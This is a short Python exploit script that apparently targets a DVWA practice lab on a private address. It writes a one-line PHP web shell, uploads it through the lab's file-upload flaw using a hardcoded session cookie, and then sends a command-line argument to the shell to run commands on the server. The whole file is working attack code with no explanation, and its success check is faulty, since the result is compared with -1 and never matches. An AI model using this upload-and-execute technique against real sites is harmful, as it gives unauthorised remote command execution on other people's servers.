import requests
import sys
from time import sleep

def file_upload():
    URL="http://10.0.2.13:8080/vulnerabilities/upload/"
    webshell = open("webshell_test.php","w")
    webshell.write("<?php system($_POST['cmd']); ?>")
    webshell.close()

    files = {
            "MAX_FILE_SIZE":(None,"100000"),
            "uploaded":open("webshell_test.php","r"),
            "Upload":(None,"Upload"),
            }
    req = session1.post(URL,cookies=cookie,files=files)

def file_exec(cmd):
    URL="http://10.0.2.13:8080/hackable/uploads/webshell_test.php"
    data= {"cmd":cmd}
    rce = session2.post(URL,cookies=cookie, data=data)
    
    if(rce.text != -1):
        print("\n\n")
        print("Crack Success!!")
        print("\n\n")
        print(rce.text)
        exit(0)
    else:
        print("\n\n")
        print("Crack Failed")
        print("\n\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: {} <command>".format(sys.argv[0]))
        exit(0)
    else:
        session1=requests.Session()
        session2=requests.Session()
        cookie={
                "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
                "security":"low"
                }

file_upload()
file_exec(sys.argv[1])
